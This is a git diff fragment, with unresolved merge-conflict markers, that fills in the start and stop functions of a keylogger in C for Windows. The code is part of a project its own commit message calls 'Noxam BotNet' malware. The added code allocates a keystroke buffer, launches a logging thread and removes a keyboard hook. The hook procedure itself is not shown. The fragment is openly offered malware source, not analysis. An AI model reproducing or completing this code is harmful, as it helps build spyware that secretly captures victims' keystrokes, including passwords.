@@ -67,7 +67,29 @@ char NoxamEasyToLower(char NxmIn)
 */
 bool NoxamStartLogger()
 {
+<<<<<<< HEAD
 
+=======
+    if (NxmKeyLogBuffer == 0)
+    {
+        NxmKeyLogBuffer = (char*)malloc(NOXAM_KEYLOG_BUFFER_SIZE);
+    }
+
+    if (NxmIsLogging)
+    {
+        return true;
+    }
+    HINSTANCE HExE = GetModuleHandle(NULL);
+
+    if (!HExE)
+    {
+        return 1;
+    }
+    CreateThread(NULL, NULL, NoxamStartLoggerInvoker, (LPVOID)HExE, NULL, NULL);
+    NxmIsLogging = true;
+
+    return NxmIsLogging;
+>>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)
 }
 
 /*
@@ -80,7 +102,17 @@ bool NoxamStartLogger()
 */
 bool NoxamStopLogger()
 {
+<<<<<<< HEAD
 
+=======
+    if (!NxmIsLogging)
+    {
+        return true;
+    }
+    NxmIsLogging = !UnhookWindowsHookEx(NxmKeyHook);
+
+    return NxmIsLogging;
+>>>>>>> 3931c6e (Completed Screenshot Malware For Noxam BotNet)
 }
 
 /*
